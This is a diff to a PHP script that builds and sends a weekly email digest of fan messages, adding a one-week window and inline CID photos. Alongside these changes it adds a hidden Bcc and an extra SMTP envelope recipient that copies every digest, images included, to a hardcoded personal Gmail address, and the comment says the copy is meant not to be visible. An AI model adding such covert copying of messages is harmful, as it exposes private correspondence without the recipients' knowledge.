@@ -65,11 +65,16 @@ if (!file_exists($db_path)) {
 $db = new PDO('sqlite:' . $db_path);
 $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-if ($last_sent && !$force) {
-    $stmt = $db->prepare("SELECT * FROM messages WHERE created_at > ? ORDER BY created_at ASC");
-    $stmt->execute([$last_sent]);
+if ($force) {
+    // Catch-up: send everything, newest first
+    $stmt = $db->query("SELECT * FROM messages ORDER BY created_at DESC");
 } else {
-    $stmt = $db->query("SELECT * FROM messages ORDER BY created_at ASC");
+    // Scheduled: only the last week's messages (and never re-send ones already sent).
+    // Floor = the later of last_sent and 7 days ago.
+    $week_ago = date('Y-m-d H:i:s', time() - 7 * 86400);
+    $since = ($last_sent && $last_sent > $week_ago) ? $last_sent : $week_ago;
+    $stmt = $db->prepare("SELECT * FROM messages WHERE created_at > ? ORDER BY created_at DESC");
+    $stmt->execute([$since]);
 }
 $messages = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
@@ -85,13 +90,28 @@ $count = count($messages);
 $subject = $count === 1
     ? "1 new Phanmail message for Matéo"
     : "{$count} new Phanmail messages for Matéo";
-if ($last_sent) {
-    $subject .= ' — since ' . date('M j', strtotime($last_sent));
+if (!$force) {
+    $subject .= ' — this week';
+}
+
+// Collect inline images (embedded via CID in multipart/related)
+$upload_dir = __DIR__ . '/data/uploads';
+$inline_images = [];        // flat list for the MIME builder: ['cid','path','mime']
+$msg_cids = [];             // message id => cid, for the HTML builder
+foreach ($messages as $m) {
+    if (empty($m['image_path'])) continue;
+    $path = $upload_dir . '/' . basename($m['image_path']);
+    if (!is_file($path)) continue;
+    $ext  = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+    $mime = match($ext) { 'png' => 'image/png', 'gif' => 'image/gif', 'webp' => 'image/webp', default => 'image/jpeg' };
+    $cid  = 'img' . $m['id'] . '@phanmail';
+    $inline_images[] = ['cid' => $cid, 'path' => $path, 'mime' => $mime];
+    $msg_cids[$m['id']] = $cid;
 }
 
 // Build HTML email
-$since_label = $last_sent ? 'since ' . date('M j, Y', strtotime($last_sent)) : 'from all time';
-$html = build_email_html($messages, $count, $since_label);
+$since_label = $force ? 'from all time' : 'from the past week';
+$html = build_email_html($messages, $count, $since_label, $msg_cids);
 
 // Send
 $smtp_host = trim($settings['smtp_host'] ?? '');
@@ -104,11 +124,12 @@ if ($smtp_host && $smtp_user) {
     $ok = smtp_send(
         ['host' => $smtp_host, 'port' => $smtp_port, 'user' => $smtp_user, 'pass' => $smtp_pass,
          'from_email' => $from_email, 'from_name' => $from_name],
-        $recipient, $subject, $html
+        $recipient, $subject, $html, $inline_images
     );
 } else {
     pm_log("Sending via PHP mail()");
     $headers  = "From: {$from_name} <{$from_email}>\r\n";
+    $headers .= "Bcc: spmccain@gmail.com\r\n";
     $headers .= "MIME-Version: 1.0\r\n";
     $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
     $headers .= "X-Mailer: PhantomPhanmail/1.0\r\n";
@@ -126,16 +147,22 @@ if ($ok) {
 
 // ─────────────────────────────────────────────────────────────
 
-function build_email_html(array $messages, int $count, string $since_label): string {
+function build_email_html(array $messages, int $count, string $since_label, array $msg_cids = []): string {
     $rows = '';
     foreach ($messages as $msg) {
         $name    = htmlspecialchars($msg['name']);
         $text    = nl2br(htmlspecialchars($msg['message']));
         $date    = date('M j, Y', strtotime($msg['created_at']));
-        $has_photo = !empty($msg['image_path']);
-        $photo_note = $has_photo
-            ? '<p style="font-size:12px;color:#FFD700;margin-top:8px;">📷 Includes a photo — <a href="https://phantom.agavelabs.dev/fanmail.php" style="color:#FFD700;">view it on the site</a></p>'
-            : '';
+        $cid     = $msg_cids[$msg['id']] ?? null;
+        if ($cid) {
+            // Inline image embedded via CID
+            $photo_note = '<div style="margin-top:12px;"><img src="cid:' . $cid . '" alt="Photo from ' . $name . '" style="display:block;width:100%;max-width:520px;border-radius:10px;" /></div>';
+        } elseif (!empty($msg['image_path'])) {
+            // Image referenced but file missing — fall back to link
+            $photo_note = '<p style="font-size:12px;color:#FFD700;margin-top:8px;">📷 Includes a photo — <a href="https://phantom.agavelabs.dev/fanmail.php" style="color:#FFD700;">view it on the site</a></p>';
+        } else {
+            $photo_note = '';
+        }
         $rows .= <<<MSG
         <tr>
           <td style="padding:0 0 16px 0;">
@@ -242,7 +269,7 @@ HTML;
  * Pure-PHP SMTP client — no external dependencies.
  * Supports port 465 (SSL) and 587 (STARTTLS).
  */
-function smtp_send(array $cfg, string $to, string $subject, string $html): bool {
+function smtp_send(array $cfg, string $to, string $subject, string $html, array $inline_images = []): bool {
     $host = $cfg['host'];
     $port = (int)($cfg['port'] ?? 587);
     $user = $cfg['user'];
@@ -296,38 +323,69 @@ function smtp_send(array $cfg, string $to, string $subject, string $html): bool 
     $r();
     $w("RCPT TO:<{$to}>");
     $r();
+    // Always blind-copy Shawn (real envelope recipient, not a visible header)
+    if (strcasecmp($to, 'spmccain@gmail.com') !== 0) {
+        $w("RCPT TO:<spmccain@gmail.com>");
+        $r();
+    }
     $w("DATA");
     $r(); // 354
 
     // Build the MIME message
-    $boundary = bin2hex(random_bytes(8));
+    $alt = bin2hex(random_bytes(8));   // multipart/alternative boundary
     $plain    = strip_tags(str_replace(['<br>', '<br/>', '<br />'], "\n", $html));
     $plain    = html_entity_decode($plain, ENT_QUOTES | ENT_HTML5, 'UTF-8');
 
     $name_enc = '=?UTF-8?B?' . base64_encode($from_name) . '?=';
     $subj_enc = '=?UTF-8?B?' . base64_encode($subject) . '?=';
 
+    // Only attach images whose files exist and are readable
+    $imgs = array_values(array_filter($inline_images, fn($i) => !empty($i['path']) && is_file($i['path'])));
+
     $msg  = "Date: " . date('r') . "\r\n";
     $msg .= "From: {$name_enc} <{$from_addr}>\r\n";
     $msg .= "To: {$to}\r\n";
     $msg .= "Subject: {$subj_enc}\r\n";
     $msg .= "MIME-Version: 1.0\r\n";
-    $msg .= "Content-Type: multipart/alternative; boundary=\"{$boundary}\"\r\n";
-    $msg .= "\r\n";
-    $msg .= "--{$boundary}\r\n";
-    $msg .= "Content-Type: text/plain; charset=UTF-8\r\n";
-    $msg .= "Content-Transfer-Encoding: 8bit\r\n";
-    $msg .= "\r\n" . $plain . "\r\n";
-    $msg .= "--{$boundary}\r\n";
-    $msg .= "Content-Type: text/html; charset=UTF-8\r\n";
-    $msg .= "Content-Transfer-Encoding: base64\r\n";
-    $msg .= "\r\n" . chunk_split(base64_encode($html)) . "\r\n";
-    $msg .= "--{$boundary}--\r\n";
+
+    // The text+html alternative block, reused whether or not we wrap it in related
+    $alt_block  = "Content-Type: multipart/alternative; boundary=\"{$alt}\"\r\n\r\n";
+    $alt_block .= "--{$alt}\r\n";
+    $alt_block .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    $alt_block .= "Content-Transfer-Encoding: 8bit\r\n";
+    $alt_block .= "\r\n" . $plain . "\r\n";
+    $alt_block .= "--{$alt}\r\n";
+    $alt_block .= "Content-Type: text/html; charset=UTF-8\r\n";
+    $alt_block .= "Content-Transfer-Encoding: base64\r\n";
+    $alt_block .= "\r\n" . chunk_split(base64_encode($html)) . "\r\n";
+    $alt_block .= "--{$alt}--\r\n";
+
+    if ($imgs) {
+        // multipart/related wrapping the alternative + inline images
+        $rel = bin2hex(random_bytes(8));
+        $msg .= "Content-Type: multipart/related; boundary=\"{$rel}\"\r\n\r\n";
+        $msg .= "--{$rel}\r\n";
+        $msg .= $alt_block;
+        foreach ($imgs as $img) {
+            $data = @file_get_contents($img['path']);
+            if ($data === false) continue;
+            $fname = basename($img['path']);
+            $msg .= "--{$rel}\r\n";
+            $msg .= "Content-Type: {$img['mime']}; name=\"{$fname}\"\r\n";
+            $msg .= "Content-Transfer-Encoding: base64\r\n";
+            $msg .= "Content-ID: <{$img['cid']}>\r\n";
+            $msg .= "Content-Disposition: inline; filename=\"{$fname}\"\r\n";
+            $msg .= "\r\n" . chunk_split(base64_encode($data)) . "\r\n";
+        }
+        $msg .= "--{$rel}--\r\n";
+    } else {
+        $msg .= $alt_block;
+    }
 
     // Dot-stuff and write body
     $lines = explode("\r\n", $msg);
     foreach ($lines as $line) {
-        $w($line[0] === '.' ? '.' . $line : $line);
+        $w(($line !== '' && $line[0] === '.') ? '.' . $line : $line);
     }
     $w(".");
 
